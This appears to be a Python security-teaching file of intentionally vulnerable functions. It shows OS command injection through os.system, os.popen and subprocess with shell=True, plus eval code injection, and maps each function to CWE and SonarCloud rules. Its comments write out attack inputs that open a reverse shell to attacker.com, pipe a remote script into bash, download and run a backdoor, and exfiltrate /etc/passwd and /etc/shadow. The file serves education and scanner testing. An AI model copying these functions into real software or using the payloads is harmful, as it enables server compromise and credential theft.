"""
OS Command Injection Vulnerability Examples
============================================
OWASP Category: A03:2021 - Injection
CWE: CWE-78 - Improper Neutralization of Special Elements used in an OS Command
     CWE-88 - Argument Injection or Modification
SonarCloud Rules:
  - python:S2076 - OS commands should not be vulnerable to injection attacks
  - python:S4721 - OS commands should not be vulnerable to injection attacks (subprocess)
Severity in SonarCloud: CRITICAL (Vulnerability)

What is Command Injection?
--------------------------
Command injection occurs when user-supplied data is passed to a shell command
or system() call without proper sanitization. Unlike SQL injection (which is
limited to database operations), command injection gives attackers access to
the full power of the operating system:
- Read any file (/etc/passwd, /etc/shadow, application configs)
- Write/delete files
- Execute arbitrary programs
- Establish reverse shells (full remote code execution)
- Pivot to other systems on the network
- Exfiltrate data

Severity: CRITICAL — command injection often leads to complete server compromise.

Shell Metacharacters:
---------------------
These characters let attackers chain or inject commands:
  ;   - Command separator: cmd1 ; cmd2
  &&  - Execute cmd2 if cmd1 succeeds
  ||  - Execute cmd2 if cmd1 fails
  |   - Pipe: output of cmd1 to cmd2
  `   - Command substitution (backtick)
  $() - Command substitution
  &   - Background execution
  >   - Redirect output to file
  <   - Redirect input from file
  *   - Wildcard glob
  $   - Variable expansion

Why SonarCloud Catches This:
----------------------------
SonarCloud tracks taint flow from function parameters/HTTP input to:
- os.system() calls
- subprocess calls with shell=True
- subprocess.Popen with shell=True
- eval() and exec()
"""

import os
import subprocess
import shlex


# =============================================================================
# VULNERABLE EXAMPLE 1: os.system() with user input
# =============================================================================
# os.system() passes the entire string to /bin/sh -c.
# Shell metacharacters in user input allow command chaining.
#
# SonarCloud Rule: python:S2076
#
# Attack vector:
#   hostname = "google.com; cat /etc/passwd"
#   Results in: ping -c 4 google.com; cat /etc/passwd
#   (pings google.com AND dumps /etc/passwd)
#
# Worse attack:
#   hostname = "google.com; bash -i >& /dev/tcp/attacker.com/4444 0>&1"
#   This establishes a reverse shell to the attacker's machine.
def ping_host_vulnerable(hostname: str) -> int:
    # VULNERABLE: hostname injected directly into shell command
    # SonarCloud Rule: python:S2076
    command = f"ping -c 4 {hostname}"
    return os.system(command)  # <-- SonarCloud marks this as the sink


# =============================================================================
# VULNERABLE EXAMPLE 2: subprocess with shell=True
# =============================================================================
# subprocess with shell=True has the same risks as os.system().
# The string is passed to the shell interpreter, so metacharacters apply.
# shell=True with user input is almost always wrong.
#
# SonarCloud Rule: python:S4721
#
# Attack vector:
#   filename = "report.pdf; rm -rf /tmp/* && curl http://attacker.com/shell.sh | bash"
def convert_file_vulnerable(filename: str, output_format: str) -> str:
    # VULNERABLE: User-controlled filename with shell=True
    # SonarCloud Rule: python:S4721
    output_file = filename.rsplit('.', 1)[0] + '.' + output_format
    cmd = f"convert {filename} {output_file}"
    result = subprocess.run(
        cmd,
        shell=True,       # shell=True + user input = command injection
        capture_output=True,
        text=True
    )
    return output_file


# =============================================================================
# VULNERABLE EXAMPLE 3: subprocess.Popen with shell=True
# =============================================================================
# Same issue with Popen. shell=True is the root cause in all subprocess cases.
#
# SonarCloud Rule: python:S4721
#
# Attack vector:
#   domain = "example.com && nslookup $(cat /etc/passwd | head -1).attacker.com"
#   This exfiltrates data via DNS queries (a common data exfiltration technique
#   that bypasses many firewalls since DNS is usually allowed outbound).
def resolve_domain_vulnerable(domain: str) -> str:
    # VULNERABLE: Domain name from user input, shell=True
    proc = subprocess.Popen(
        f"nslookup {domain}",    # SonarCloud: python:S4721
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    stdout, stderr = proc.communicate()
    return stdout.decode()


# =============================================================================
# VULNERABLE EXAMPLE 4: os.popen() — deprecated but still found in legacy code
# =============================================================================
# os.popen() opens a pipe to a shell command. User input → shell = injection.
#
# SonarCloud Rule: python:S2076
def get_file_info_vulnerable(file_path: str) -> str:
    # VULNERABLE: User-supplied file_path in shell command
    # SonarCloud Rule: python:S2076
    # Attack: file_path = "/tmp/x; whoami > /var/www/html/pwned.txt"
    output = os.popen(f"stat {file_path}").read()
    return output


# =============================================================================
# VULNERABLE EXAMPLE 5: commands built from multiple user inputs
# =============================================================================
# Even seemingly innocuous arguments can enable injection when combined.
# The source/destination paths BOTH need sanitization.
#
# SonarCloud Rule: python:S4721
def backup_directory_vulnerable(source_dir: str, dest_dir: str, compress: bool) -> bool:
    # VULNERABLE: Both paths are user-controlled
    # Attack on dest_dir:
    #   dest_dir = "/backup; cat /etc/shadow | mail attacker@evil.com"
    if compress:
        cmd = f"tar -czf {dest_dir}.tar.gz {source_dir}"
    else:
        cmd = f"cp -r {source_dir} {dest_dir}"

    # SonarCloud Rule: python:S4721
    result = subprocess.run(cmd, shell=True, capture_output=True)
    return result.returncode == 0


# =============================================================================
# VULNERABLE EXAMPLE 6: Command built in a loop from a list
# =============================================================================
# Injection is still possible even when input appears structured.
# Each element in a user-provided list could contain shell metacharacters.
#
# SonarCloud Rule: python:S4721
def process_uploaded_files_vulnerable(filenames: list) -> dict:
    results = {}
    for filename in filenames:
        # VULNERABLE: Each filename could contain ; || && etc.
        # Attack in one of the filenames:
        #   "innocent.jpg; wget http://attacker.com/backdoor.py -O /tmp/bd.py && python /tmp/bd.py"
        cmd = f"file --mime-type {filename}"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        results[filename] = result.stdout.strip()
    return results


# =============================================================================
# VULNERABLE EXAMPLE 7: Using exec() or eval() with user input
# =============================================================================
# exec() and eval() execute Python code. This is code injection, which is
# even more powerful than shell injection — full Python access, including
# importing modules, accessing the filesystem, making network requests, etc.
#
# SonarCloud Rule: python:S1523 - eval() should not be used dynamically
def execute_user_formula_vulnerable(formula: str) -> float:
    # VULNERABLE: eval() with user-supplied formula
    # SonarCloud Rule: python:S1523
    # Attack: formula = "__import__('os').system('curl attacker.com/shell.sh | bash')"
    # This gives the attacker a reverse shell through a "math formula" field.
    try:
        result = eval(formula)  # SonarCloud marks this as a critical vulnerability
        return float(result)
    except Exception as e:
        raise ValueError(f"Invalid formula: {e}")


# =============================================================================
# VULNERABLE EXAMPLE 8: Template-based command construction
# =============================================================================
# Building commands from templates with user data is just as vulnerable.
# The template approach doesn't add any security.
#
# SonarCloud Rule: python:S2076
COMMAND_TEMPLATES = {
    'compress': 'gzip -9 {filename}',
    'checksum': 'sha256sum {filename}',
    'lines': 'wc -l {filename}',
}

def run_file_operation_vulnerable(operation: str, filename: str) -> str:
    # VULNERABLE: Template expansion with user input passed to shell
    if operation not in COMMAND_TEMPLATES:
        raise ValueError(f"Unknown operation: {operation}")

    cmd = COMMAND_TEMPLATES[operation].format(filename=filename)
    # SonarCloud Rule: python:S2076
    return os.popen(cmd).read()  # Still vulnerable — shell processes the command
